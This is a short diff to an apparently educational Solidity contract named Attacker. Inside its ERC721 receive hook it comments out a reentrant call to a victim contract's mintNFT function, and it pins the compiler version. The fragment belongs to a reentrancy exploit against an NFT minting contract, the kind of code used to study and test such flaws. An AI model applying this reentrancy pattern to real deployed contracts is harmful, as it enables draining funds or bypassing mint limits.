@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity 0.8.20;
 
 import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 import "./vault.sol";
@@ -38,7 +38,7 @@ contract Attacker is IERC721Receiver {
 
         if(upper > 2){
             upper -= 2;
-            victim.mintNFT{value: point_one_ether * upper}(upper);
+            // victim.mintNFT{value: point_one_ether * upper}(upper);
         }
 
         return this.onERC721Received.selector;
